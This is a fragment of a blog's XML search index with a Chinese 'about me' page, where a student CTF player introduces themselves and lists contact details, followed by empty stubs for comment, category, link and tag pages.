        <content type="html"><![CDATA[<p>在下St4rr。</p><p>目前南邮大二在读，网安新手。</p><p>一个菜狗CTFer，misc手。</p><p>已加入CTF战队X1cT34m和Polaris，主要职责是给大佬们端茶。</p><p>努力学习中，争取不拖大佬们的后腿Orz。</p><p>这里是本菜狗的博客，技能有限，认识尚浅，如有问题欢迎指出 :)</p><p>联系方式：</p><p>QQ: 3092158216</p><p>邮箱：<a href="mailto:&#x33;&#x30;&#57;&#50;&#49;&#x35;&#x38;&#50;&#x31;&#54;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#x33;&#x30;&#57;&#50;&#49;&#x35;&#x38;&#50;&#x31;&#54;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a></p><p>​<a href="mailto:&#115;&#116;&#x34;&#114;&#x72;&#x32;&#x33;&#51;&#51;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#115;&#116;&#x34;&#114;&#x72;&#x32;&#x33;&#51;&#51;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Comment</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
